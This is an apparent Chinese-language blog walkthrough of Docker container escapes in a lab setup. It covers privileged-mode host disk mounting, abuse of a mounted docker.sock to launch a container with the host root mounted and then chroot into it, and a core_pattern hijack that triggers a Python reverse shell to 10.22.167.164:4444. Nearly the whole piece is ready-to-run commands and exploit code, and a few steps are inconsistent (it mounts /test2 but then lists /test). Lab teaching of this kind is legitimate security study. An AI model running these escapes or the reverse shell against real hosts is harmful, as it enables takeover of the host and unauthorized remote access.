---
title: "（3）云原生-docker逃逸"
slug: 3-yun-yuan-sheng-dockertao-yi
cover: ""
date: 2026-03-12
categories:
  - 云上攻防
tags:
  - Docker逃逸
halo:
  site: http://www.hzhsec.top
  name: 4fd2529c-10c1-4188-ad31-e6c7fa884855
  publish: true
---

---
➢特权模式
➢ 挂载Procfs
➢ 挂载Socket

---
文章参考:
https://wiki.teamssix.com/CloudNative/

# 一.docker-特权模式逃逸

**原理**:
用户在启动镜像使,赋予了镜像root特权启动,导致容器里面的用户可以执行危险指令,例如通过将本地主机的盘挂载到容器里面,从而实现逃逸

**启动靶场**：
```
docker run --rm --privileged=true -it alpine
```
![image.png](https://cdn.jsdmirror.com/gh/hzhsec/upload@main/20260312192003672.png)
默认会直接进入容器,如果没有则使用命令进入
查看容器编号
```
docker ps
```
![image.png](https://cdn.jsdmirror.com/gh/hzhsec/upload@main/20260312192452371.png)

进入容器
```
docker exec -it 编号 /bin/sh
```
![image.png](https://cdn.jsdmirror.com/gh/hzhsec/upload@main/20260312192425203.png)

检测是否是docker环境：
```
cat /proc/1/cgroup | grep -qi docker && echo "Is Docker" || echo "Not Docker"
或者直接根目录执行ls -alh,出现.docekrenv说明是docker
```
判断是否是特权：
```
cat /proc/self/status | grep CapEff
```
如果是00000001fffffffff说明是特权
![image.png](https://cdn.jsdmirror.com/gh/hzhsec/upload@main/20260312191935337.png)

查看目录：
```
fdisk -l
```
![image.png](https://cdn.jsdmirror.com/gh/hzhsec/upload@main/20260312193109363.png)
可知当前我们处于sda1盘

**实现特权逃逸**：

将sda3盘挂载到/test文件夹
```
mkdir /test2 && mount /dev/sda3 /test2
```
![image.png](https://cdn.jsdmirror.com/gh/hzhsec/upload@main/20260312193258688.png)

判断结果：
```
cd /test/ && ls
```
成功逃逸到主机

# 二.docker-危险挂载逃逸

## 1、挂载Docker Socket逃逸

**原理**:
docker socket是什么?
Docker daemon 通过一个 Unix socket 提供 API：
```
/var/run/docker.sock
```
docker cli实际上是通过调用这个api实现控制docker的
例如`docker run`,`docker ps`,都是通过socket 发送http请求

所以当用户将`/var/run/docker.sock`挂载进`docker`时,攻击者只要在`docker`里面再安装`docker`调用该`api`就可以实现将本地主机挂载到新的`docker`容器

启动靶场：
```
docker run -itd --name with_docker_sock -v /var/run/docker.sock:/var/run/docker.sock ubuntu
```
进入环境：
```
docker exec -it with_docker_sock /bin/bash
```
![image.png](https://cdn.jsdmirror.com/gh/hzhsec/upload@main/20260312194818170.png)

检测环境：
```
ls -lah /var/run/docker.sock
```
![image.png](https://cdn.jsdmirror.com/gh/hzhsec/upload@main/20260312194903356.png)

**挂载逃逸**：
更新`apt`源并安装`curl`
```
apt-get update
apt-get install curl
```

一键安装`docker`
```
curl -fsSL https://get.docker.com/ | sh
```
在容器内部创建一个新的容器，并将宿主机目录挂载到新的容器内部
```
docker run -it -v /:/host ubuntu /bin/bash
chroot /host
```
可能会报错类似
`Error response from daemon: client version 1.54 is too new. Maximum supported API version is 1.39`
是由于客户端太新，而服务端太旧，所以 `docker` 无法调用。
解决指令:手动指定 API 版本`export DOCKER_API_VERSION=1.39`
成功将主机在容器里面的新容器挂载:
![image.png](https://cdn.jsdmirror.com/gh/hzhsec/upload@main/20260312200924383.png)

## 2、挂载宿主机procfs逃逸

**原理**:
本质:利用 **Linux 的 `/proc` 虚拟文件系统** 获取或修改宿主机进程信息，从而进入宿主机的 **namespace**。
`/proc` 记录的是 **内核和进程信息**。

如果容器可以访问 **宿主机的 `/proc`**，就可能：
1. 找到宿主机进程
2. 进入该进程的 `namespace`
3. 获得宿主机` root`

https://github.com/Metarget/metarget/tree/master/writeups_cnv/mount-host-procfs

启动环境：
```
docker run -it -v /proc/sys/kernel/core_pattern:/host/proc/sys/kernel/core_pattern ubuntu
```

检测环境：
```
find / -name core_pattern
```
![image.png](https://cdn.jsdmirror.com/gh/hzhsec/upload@main/20260312202401306.png)

查找路径：
将输出的id号复制
```
(workdir) cat /proc/mounts | grep docker
```
![image.png](https://cdn.jsdmirror.com/gh/hzhsec/upload@main/20260312211216931.png)


替换这里的id号
```
/var/lib/docker/overlay2/32d054bc957db346520de8c8cef1565c264f702034b184140546e5c33997da91/merged
```

构造文件
```
echo -e "|/var/lib/docker/overlay2/3c89403d33bef696784f67e1d546d97a6a49178d2323caa804a7e647793558a2/merged/tmp/.x.py \rcore           " > /host/proc/sys/kernel/core_pattern
```


写入反弹文件：
替换lhost和lport为自己的主机
```
cat >/tmp/.x.py << EOF
#!/usr/bin/python
import os
import pty
import socket
lhost = "10.22.167.164"
lport = 4444
def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((lhost, lport))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    os.putenv("HISTFILE", '/dev/null')
    pty.spawn("/bin/bash")
    os.remove('/tmp/.x.py')
    s.close()
if __name__ == "__main__":
    main()
EOF

```
启动监听:
```
nc -lvvp 4444
```
![image.png](https://cdn.jsdmirror.com/gh/hzhsec/upload@main/20260312211404097.png)

赋予可执行权限
```
chmod +x /tmp/.x.py
```

创建触发错误的程序
```
cat >/tmp/x.c << EOF
#include <stdio.h>
int main(void)
{
    int *a = NULL;
    *a = 1;
    return 0;
}
EOF
```

编译
如果docker中没有可以自己编译后上传上去
```
gcc /tmp/x.c -o x
```

执行文件：
```
./x
```
![image.png](https://cdn.jsdmirror.com/gh/hzhsec/upload@main/20260312211639403.png)
![image.png](https://cdn.jsdmirror.com/gh/hzhsec/upload@main/20260312211652223.png)


模拟真实场景：

1、高权限-Web入口到Docker逃逸（Java）
```
docker run --rm --privileged=true -it -p 8888:8080 vulfocus/shiro-721
```

2、低权限-Web入口到Docker逃逸（PHP）
```
docker run --rm --privileged=true -it -p 8080:80 sagikazarmark/dvwa
```